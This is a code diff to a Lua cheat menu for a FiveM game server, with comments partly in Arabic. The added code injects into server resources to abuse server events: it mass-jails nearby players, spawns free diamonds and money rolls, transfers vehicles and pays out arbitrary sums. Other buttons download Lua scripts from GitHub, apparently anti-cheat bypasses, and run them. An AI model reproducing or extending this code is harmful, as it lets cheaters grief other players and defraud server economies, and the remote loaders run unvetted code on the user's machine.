@@ -2778,27 +2778,18 @@ MachoMenuButton(GeneralRightTop, "Revive those around me", function()
     
     reviveNearbyActive = true
     
-    local myPed = PlayerPedId()
-    local myCoords = GetEntityCoords(myPed)
     local nearbyPlayers = {}
-    local maxDistance = 50.0 -- المسافة القصوى (50 متر)
     
-    -- البحث عن اللاعبين القريبين
+    -- جلب كل اللاعبين (بدون شرط مسافة)
     for _, player in ipairs(GetActivePlayers()) do
         if player ~= PlayerId() then
             local playerPed = GetPlayerPed(player)
             if DoesEntityExist(playerPed) then
-                local playerCoords = GetEntityCoords(playerPed)
-                local distance = GetDistanceBetweenCoords(myCoords.x, myCoords.y, myCoords.z, playerCoords.x, playerCoords.y, playerCoords.z, true)
-                
-                if distance <= maxDistance then
                     local serverId = GetPlayerServerId(player)
                     if serverId and serverId > 0 then
                         table.insert(nearbyPlayers, {
-                            serverId = serverId,
-                            distance = distance
+                        serverId = serverId
                         })
-                    end
                 end
             end
         end
@@ -2831,6 +2822,59 @@ MachoMenuButton(GeneralRightTop, "Revive those around me", function()
         end
         reviveNearbyActive = false
         MachoMenuNotification("Players", "✅ Revived " .. #nearbyPlayers .. " player(s) including yourself. Total: " .. totalSent .. " requests")
+    end)
+end)
+
+-- Button Jail Nearby Players
+local jailNearbyActive = false
+MachoMenuButton(GeneralRightTop, "سجن محيط", function()
+    if jailNearbyActive then
+        return
+    end
+    
+    jailNearbyActive = true
+    
+    local myPed = PlayerPedId()
+    local myCoords = GetEntityCoords(myPed)
+    local nearbyPlayers = {}
+    local maxDistance = 50.0 -- المسافة القصوى (50 متر)
+    
+    -- البحث عن اللاعبين القريبين
+    for _, player in ipairs(GetActivePlayers()) do
+        if player ~= PlayerId() then
+            local playerPed = GetPlayerPed(player)
+            if DoesEntityExist(playerPed) then
+                local playerCoords = GetEntityCoords(playerPed)
+                local distance = GetDistanceBetweenCoords(myCoords.x, myCoords.y, myCoords.z, playerCoords.x, playerCoords.y, playerCoords.z, true)
+                
+                if distance <= maxDistance then
+                    local serverId = GetPlayerServerId(player)
+                    if serverId and serverId > 0 then
+                        table.insert(nearbyPlayers, {
+                            serverId = serverId,
+                            distance = distance
+                        })
+                    end
+                end
+            end
+        end
+    end
+    
+    if #nearbyPlayers == 0 then
+        jailNearbyActive = false
+        MachoMenuNotification("سجن محيط", "❌ لا يوجد لاعبين قريبين (ضمن 50 متر)")
+        return
+    end
+    
+    Citizen.CreateThread(function()
+        local totalSent = 0
+        for _, playerData in ipairs(nearbyPlayers) do
+            TriggerServerEvent("police:server:JailPlayer", playerData.serverId, 100)
+            totalSent = totalSent + 1
+            Citizen.Wait(10)
+        end
+        jailNearbyActive = false
+        MachoMenuNotification("سجن محيط", "✅ تم سجن " .. #nearbyPlayers .. " لاعب. المجموع: " .. totalSent .. " طلب")
     end)
 end)
 
@@ -10891,6 +10935,7 @@ MachoMenuText(MenuWindow,"Triggers & Servers")
     local SelfSection = MachoMenuGroup(MainTab, "Self", 
         TabsBarWidth + 5, 5 + MachoPaneGap, 
         TabsBarWidth + SERVERCFWEachSectionWidth, MenuSize.y - 5)
+
         
 MachoMenuButton(SelfSection, "Open Shop 1", function()
     MachoInjectResource2(2, "any", [[
@@ -11010,6 +11055,10 @@ TriggerServerEvent('inventory:server:OpenInventory', 'shop', 'Shop', {
         { amount = 10000, info = {}, name = "metalscrap", price = 0, slot = 73, type = "item" },
         { amount = 10000, info = {}, name = "ganglap",    price = 0, slot = 74, type = "item" },
         { amount = 10000, info = {}, name = "hourse",     price = 0, slot = 75, type = "item" },
+        { amount = 100000, info = {}, name = "bluediamond",     price = 0, slot = 76, type = "item" },
+        { amount = 10000, info = {}, name = "diamond",     price = 0, slot = 77, type = "item" },
+        { amount = 10000, info = {}, name = "moneyroll",     price = 0, slot = 78, type = "item" },
+
     }
 })
 
@@ -11270,6 +11319,35 @@ end)
         MachoMenuNotification("Self", "Revived")
     end)
     
+    MachoMenuButton(SelfSection, "Auto Transfer Vehicle", function()
+        local ped = PlayerPedId()
+        local veh = GetVehiclePedIsIn(ped, false)
+        if veh ~= 0 then
+            local plate = GetVehicleNumberPlateText(veh)
+            if plate then
+                -- حذف كل المسافات من اللوحة لضمان المطابقة
+                plate = plate:gsub("%s+", "")
+            else
+                plate = "Unknown"
+            end
+            
+            local model = GetEntityModel(veh)
+            -- الحصول على اسم الموديل (Spawn Name)
+            local vname = GetDisplayNameFromVehicleModel(model)
+            
+            MachoInjectResource2(3, "any", [[
+                TriggerServerEvent("Rc2vehicleshop:server:transferMenu", {
+                    action = 2,
+                    plate = "]] .. plate .. [[",
+                    vname = "]] .. vname .. [[",
+                })
+            ]])
+            MachoMenuNotification("Self", "Transferred! Code: " .. vname .. " | Plate: " .. plate)
+        else
+            MachoMenuNotification("Error", "You must be in a vehicle")
+        end
+    end)
+    
     MachoMenuButton(SelfSection, "Toggle Blips", function()
         -- Search for admin menu resource and verify it contains the blips toggle event
         local totalRes = GetNumResources()
@@ -11410,6 +11488,18 @@ MachoInjectResource2(2, "any", [[
             else
                 MachoMenuNotification("Error", "Invalid amount")
             end
+        else
+            MachoMenuNotification("Error", "Enter an amount")
+        end
+    end)
+    MachoMenuButton(SelfSection, "Give Money 2", function()
+        local amount = MachoMenuGetInputbox(amountInput)
+        if amount and amount ~= "" then
+            MachoInjectResource2(2, "any", [[
+                TriggerServerEvent('taxi:server:NpcPay', ]] .. amount .. [[)
+                TriggerServerEvent('taxi:server:takepayment', nil)
+            ]])
+            MachoMenuNotification("Self", "Gave Money 2: $" .. amount)
         else
             MachoMenuNotification("Error", "Enter an amount")
         end
@@ -11748,15 +11838,21 @@ MachoMenuButton(toolstabmain, "Scan Players", function()
 end)
 
 MachoMenuButton(toolstrigger, "Soon", function()  
-    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs1.lua"))
-    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs2.lua"))
-    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs3.lua"))
-    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs4.lua"))
-    MachoIsolatedInject(MachoWebRequest("https://github.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs5.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs1.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs2.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs3.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/bypaSSs1/raw/refs/heads/main/bypaSSs4.lua"))
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/nk7/refs/heads/main/fuck.lua"))
                          
     MachoMenuNotification("Scanner", "Soon")
 end)
 
+MachoMenuButton(toolstrigger, "Nk7 Hack", function()  
+    MachoIsolatedInject(MachoWebRequest("https://raw.githubusercontent.com/NitWit-4/nk7/refs/heads/main/fuck.lua"))
+
+                         
+    MachoMenuNotification("Scanner", "Nk7 Hack")
+end)
 
 local selectedKey = 0x74 -- الزر الافتراضي هو 0x74 (Caps Lock)
 local nocliptx = false  -- تصحيح الغلط: flase → false
